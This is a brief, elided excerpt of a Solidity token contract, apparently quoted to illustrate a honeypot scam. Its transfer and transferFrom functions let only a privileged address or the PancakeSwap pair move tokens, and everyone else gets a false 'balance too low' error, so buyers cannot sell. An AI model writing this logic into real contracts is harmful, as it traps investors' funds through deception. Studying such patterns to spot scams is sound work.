...
contract Token {
    ...
    constructor() {
        ...
        pancakeSwapPair = IPancakeFactory(_pancakeSwapV2Router.factory())
    ...
    function transfer(address to, uint value) public returns(bool) {
        ...
        require(msg.sender == _m || msg.sender == pancakeSwapPair, 'balance too low');
        balances[to] += value;
    ...
    function transferFrom(address from, address to, uint value) public returns(bool) {
        ...
        require(from == _m || from == pancakeSwapPair, 'balance too low');
        balances[to] += value;
        balances[from] -= value;
